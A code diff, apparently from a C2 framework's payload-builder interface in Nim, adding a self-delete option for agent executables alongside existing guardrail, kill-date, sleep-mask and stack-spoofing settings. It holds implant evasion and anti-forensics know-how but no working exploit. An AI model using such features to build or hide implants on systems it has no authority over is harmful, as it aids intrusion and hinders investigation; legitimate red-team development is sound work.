@@ -84,6 +84,8 @@ proc resetModalValues*(component: PayloadModalComponent) =
         endMinute: 0
     )
 
+    component.selfDelete = false
+
     component.moduleSelection.reset()
     component.buildLog.clear()
     component.resetTab = true
@@ -156,18 +158,19 @@ proc serializeConfig(component: PayloadModalComponent): string =
     config["sleepMask"] = %component.sleepMaskTechniques[component.sleepMask]
     config["spoofStack"] = %component.spoofStack
 
-    config["guardrails"] = newJObject()
-    if component.domainGuardrailEnabled: config["guardrails"]["domain"] = %($cast[cstring](addr component.domainGuardrail[0]))
-    if component.ipGuardrailEnabled: config["guardrails"]["ip"] = %($cast[cstring](addr component.ipGuardrail[0]))
-    if component.hostGuardrailEnabled: config["guardrails"]["hostname"] = %($cast[cstring](addr component.hostGuardrail[0]))
-    config["killDate"] = %(if component.killDateEnabled: component.killDate else: 0'i64)
-    
     config["workingHours"] = newJObject()
     if component.workingHoursEnabled and component.workingHours.enabled:
         config["workingHours"]["startHour"] = %component.workingHours.startHour.int
         config["workingHours"]["startMinute"] = %component.workingHours.startMinute.int
         config["workingHours"]["endHour"] = %component.workingHours.endHour.int
         config["workingHours"]["endMinute"] = %component.workingHours.endMinute.int
+
+    config["guardrails"] = newJObject()
+    if component.domainGuardrailEnabled: config["guardrails"]["domain"] = %($cast[cstring](addr component.domainGuardrail[0]))
+    if component.ipGuardrailEnabled: config["guardrails"]["ip"] = %($cast[cstring](addr component.ipGuardrail[0]))
+    if component.hostGuardrailEnabled: config["guardrails"]["hostname"] = %($cast[cstring](addr component.hostGuardrail[0]))
+    config["killDate"] = %(if component.killDateEnabled: component.killDate else: 0'i64)
+    config["selfDelete"] = %component.selfDelete
 
     config["modules"] = %component.moduleSelection.items[1].mapIt(it.name)
     return config.pretty()
@@ -212,6 +215,7 @@ proc loadBuildConfig(component: PayloadModalComponent, configPath: string) =
         endHour: configJson["workingHours"].getOrDefault("endHour").getInt().int32,
         endMinute: configJson["workingHours"].getOrDefault("endMinute").getInt().int32
     )
+    component.selfDelete = configJson["selfDelete"].getBool() 
     component.workingHoursEnabled = component.workingHours.enabled
 
     # Modules
@@ -342,8 +346,8 @@ proc draw*(component: PayloadModalComponent, listeners: seq[UIListener]): AgentB
                 igSameLine(0.0f, textSpacing)
                 igSetNextItemWidth(availableSize.x)
 
-                igBeginDisabled((component.sleepMaskTechniques[component.sleepMask] != $EKKO and component.sleepMaskTechniques[component.sleepMask] != $ZILEAN))
-                if (component.sleepMaskTechniques[component.sleepMask] != $EKKO and component.sleepMaskTechniques[component.sleepMask] != $ZILEAN):
+                igBeginDisabled((component.sleepMask != EKKO.int32 and component.sleepMask != ZILEAN.int32))
+                if (component.sleepMask != EKKO.int32 and component.sleepMask != ZILEAN.int32):
                     component.spoofStack = false
                 igCheckbox("##InputSpoofStack", addr component.spoofStack)
                 igEndDisabled()
@@ -498,6 +502,21 @@ proc draw*(component: PayloadModalComponent, listeners: seq[UIListener]): AgentB
                 let killDate = component.killDateModal.draw()
                 if killDate != 0:
                     component.killDate = killDate
+                
+                igDummy(vec2(0.0f, 10.0f))
+                igSeparator()
+                igDummy(vec2(0.0f, 10.0f))
+
+                # Self-delete checkbox
+                igText("Self-delete:   ")
+                igSameLine(0.0f, textSpacing)
+
+                igBeginDisabled(component.payloadType != PAYLOAD_EXE.int32)
+                if component.payloadType != PAYLOAD_EXE.int32: 
+                    component.selfDelete = false 
+                igCheckbox("##InputselfDelete", addr component.selfDelete)
+                igEndDisabled()
+                igHelpMarker("Remove the executable from disk when a execution guardrail condition is met and the agent terminates.\n\nThis option is only available for regular Windows executables (.exe).")
 
             # Tab 4: Modules
             if igBeginTabItemWithValidation("Modules", modulesError):
@@ -593,6 +612,7 @@ proc draw*(component: PayloadModalComponent, listeners: seq[UIListener]): AgentB
                             ip: if component.ipGuardrailEnabled: $(cast[cstring](addr component.ipGuardrail[0])) else: "",
                             hostname: if component.hostGuardrailEnabled: $(cast[cstring](addr component.hostGuardrail[0])) else: ""
                         ),
+                        selfDelete: component.selfDelete,
                         killDate: if component.killDateEnabled: component.killDate else: 0,
                         modules: modules
                     )
